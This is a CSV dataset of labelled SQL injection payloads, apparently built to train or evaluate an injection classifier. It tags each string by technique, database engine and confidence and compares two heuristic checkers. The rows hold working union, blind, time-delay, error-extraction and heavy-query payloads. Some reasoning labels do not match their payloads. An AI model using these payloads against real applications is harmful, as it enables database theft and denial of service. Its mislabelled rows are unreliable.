payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-3496' ) ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1820,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3496' ) ) or 9323 = 9323#
1%' ) ) ) and 3916 = 6327--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1821,boolean_blind,generic,Pattern match: 'and 3916 = 6327' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1%' ) ) ) and 3916 = 6327--
"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr",error_based,oracle,0.85,xmltype for error extraction,KEEP,,error_based,oracle,1822,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""exgr"" like ""exgr"
"-1376%"" ) ) ) or 3458 = 9503 and ( ( ( ""%"" = """,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1823,boolean_blind,generic,Pattern match: 'or 3458 = 9503' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-1376%"" ) ) ) or 3458 = 9503 and ( ( ( ""%"" = """
1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.75,Multiplication for blind,KEEP,,boolean_blind,generic,1824,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 8232 = 8232 and ( 3020 = 3020 ) *6703--
"1"" ) where 6018 = 6018 and 7533 = 7533--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1825,boolean_blind,generic,Pattern match: 'and 7533 = 7533' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" ) where 6018 = 6018 and 7533 = 7533--"
"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 9112 = 9112",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1826,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1 ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 9112 = 9112"
1' union all select null#,union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1827,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,1' union all select null#
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1828,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'hzav' = 'hzav"
1'|| ( select 'zccb' from dual where 8911 = 8911,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1829,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'zccb' from dual where 8911 = 8911
"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",union_based,oracle,0.85,UNION ALL for union-based,KEEP,,union_based,oracle,1830,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3137'|| ( select 'btif' where 1718 = 1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#"
"-3819' ) ) ) union all select 9014,9014,9014,9014,9014,9014--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1831,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3819' ) ) ) union all select 9014,9014,9014,9014,9014,9014--"
"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1832,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1' where 4149 = 4149 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1833,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1 ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )"
1 where 2382 = 2382,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1834,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 2382 = 2382
"-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 2971--",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1835,boolean_blind,generic,Pattern match: 'or 3534 = 2971' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-2276"" ) ) as qwow where 2321 = 2321 or 3534 = 2971--"
select ( case when ( 7997 = 1543 ) then 7997 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,generic,0.8,SELECT CASE WHEN for blind,KEEP,,boolean_blind,generic,1836,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,select ( case when ( 7997 = 1543 ) then 7997 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--
1 where 9404 = 9404,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,1837,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 9404 = 9404
1' ) where 7252 = 7252,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1838,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 7252 = 7252
1 ) as nsdy where 7513 = 7513,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1839,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as nsdy where 7513 = 7513
"-9337 ) union all select 5648,5648,5648,5648,5648#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1840,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9337 ) union all select 5648,5648,5648,5648,5648#"
"-2734' ) union all select 5510,5510,5510,5510,5510#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1841,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2734' ) union all select 5510,5510,5510,5510,5510#"
"-7559"" or 8792 = 6905--",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1842,boolean_blind,generic,Pattern match: 'or 8792 = 6905' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-7559"" or 8792 = 6905--"
"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'zetf' = 'zetf",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,1843,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1' and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and 'zetf' = 'zetf"
"iif ( 8354 = 3515,1,1/0 )",boolean_blind,mssql,0.85,iif() for MSSQL boolean blind,KEEP,,boolean_blind,mssql,1844,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"iif ( 8354 = 3515,1,1/0 )"
"-2612"" ) as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --",error_based,oracle,0.85,utl_inaddr for error extraction,KEEP,,error_based,oracle,1845,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected,"-2612"" ) as iwfj where 3231 = 3231 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --"
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,1846,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '"
"-7945%' ) ) ) union all select 4286,4286,4286,4286,4286,4286--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1847,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7945%' ) ) ) union all select 4286,4286,4286,4286,4286,4286--"
"-5998%"" ) union all select 2366,2366,2366,2366#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1848,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5998%"" ) union all select 2366,2366,2366,2366#"
"-6129 union all select 9122,9122#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1849,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6129 union all select 9122,9122#"
"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qfvg' = 'qfvg",error_based,oracle,0.85,ctxsys.drithsx for error extraction,KEEP,,error_based,oracle,1850,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'qfvg' = 'qfvg"
"1"" ) ) rlike sleep ( 5 ) and ( ( ""ahhx"" like ""ahhx",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1851,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) ) rlike sleep ( 5 ) and ( ( ""ahhx"" like ""ahhx"
"1 ) where 7600 = 7600 union all select null,null,null,null,null,null--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1852,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) where 7600 = 7600 union all select null,null,null,null,null,null--"
"-5945' ) ) ) union all select 4266,4266,4266,4266,4266--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1853,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5945' ) ) ) union all select 4266,4266,4266,4266,4266--"
"1"" ) as rcnk where 1800 = 1800",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1854,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as rcnk where 1800 = 1800"
"-2701"" ) ) as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1855,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2701"" ) ) as wvht where 5401 = 5401 union all select 5401,5401,5401,5401,5401,5401,5401,5401#"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""vcvb"" like ""vcvb",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1856,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ""vcvb"" like ""vcvb"
"-9688%' ) ) ) or elt ( 3695 = 7995,7995 ) and ( ( ( '%' = '",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,1857,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-9688%' ) ) ) or elt ( 3695 = 7995,7995 ) and ( ( ( '%' = '"
"1 ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 8671 = 8671",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1858,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 8671 = 8671"
1 ) ) as ewlg where 3722 = 3722 rlike sleep ( 5 ) --,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1859,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1 ) ) as ewlg where 3722 = 3722 rlike sleep ( 5 ) --
( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ),boolean_blind,firebird,0.8,CHAR case when for blind,KEEP,,boolean_blind,firebird,1860,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,( select 2412 = ( 'qqpjq'|| ( select case 2412 when 2412 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )
-6890' ) ) or 5771 = 7721--,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1861,boolean_blind,generic,Pattern match: 'or 5771 = 7721' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-6890' ) ) or 5771 = 7721--
"1"" ) where 4739 = 4739 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1862,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) where 4739 = 4739 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --"
"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,1863,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )"
"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec",heavy_query,mysql,0.85,benchmark for heavy query,KEEP,,heavy_query,mysql,1864,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""vxec"" like ""vxec"
